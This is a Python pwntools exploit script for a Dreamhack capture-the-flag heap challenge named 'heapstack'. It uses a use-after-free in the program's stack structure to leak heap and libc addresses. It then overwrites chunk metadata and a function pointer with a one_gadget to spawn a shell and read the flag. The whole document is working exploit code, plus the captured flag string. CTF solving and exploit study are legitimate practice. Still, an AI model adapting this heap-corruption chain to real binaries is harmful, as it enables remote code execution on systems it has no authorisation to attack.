#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'heapstack_patched'
HOST = 'host8.dreamhack.games'
PORT = 14149

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
b*0x401203
b*0x4012fb
b*0x401296
b*0x40136b

c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def hsup():
    sla(b'> ', b'0') 
def push():
    sla(b'> ', b'1')
def pop():
    sla(b'> ', b'2')
def write(data):
    sla(b'> ', b'3')
    sa(b': ', data)
def read():
    sla(b'> ', b'4')

# normally it saves address of data, but free save address of nextchunk base 
# if we write into a freed chunk, it will overwrite starting from nextchunk pointer 
push()
push()
push()
pop()
pop()
hsup()
hsup()
pop()
write(b'A'*0x30)
read()
rcu(b'A'*0x30)
heap_base = u64(p.recv(4).ljust(8, b'\x00')) - 0xb0
log.success(f'heap_base: {hex(heap_base)}')

pop()
push()
hsup()
hsup()
hsup()
write(p64(0x0) + p64(0xd1) + p64(0x404028) + p64(0x0)*2 + p64(0x61) + p64(heap_base + 0x80)) #malloc

pop()
pop()
pop()


p.wait(1.0)

push()
write(0x10 * b'B')
read()
rcu(0x10 * b'B')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x3c4b78
log.success(f'libc_base: {hex(libc.address)}')

one_gadget = 0xf1247 + libc.address

pop()
write(p64(one_gadget))
push()
sl(b'cd home/heapstack')
sl(b'cat flag*')
# PD{hsuP__P0P__Push}
p.interactive()
